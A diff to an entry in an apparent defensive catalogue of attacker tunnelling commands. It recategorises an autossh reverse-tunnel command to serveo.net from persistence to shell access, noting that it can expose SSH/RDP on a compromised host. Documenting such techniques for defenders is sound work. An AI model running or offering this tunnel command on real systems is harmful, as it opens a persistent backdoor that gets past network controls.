@@ -28,9 +28,9 @@ Commands:
     OperatingSystem: Windows, Mac, Linux
 
   - Command: autossh -M 0 -R <PORT>:localhost:<PORT> serveo.net
-    Description: Threat actors enabling persistence on the compromised host to ensure system automatically gets connected to the serveo.net
-    Usecase: Persisting local connections over serveo.net 
-    Category: persistence
+    Description: Threat actors enabling persistence on the compromised host to ensure system automatically gets connected to the serveo.net and can also provide shell access by exposing SSH/RDP etc.
+    Usecase: Persisting local connections over serveo.net and/or exposing SSH/RDP for persistence.
+    Category: shell-access
     Privileges: User
     OperatingSystem: Windows, Mac, Linux
 
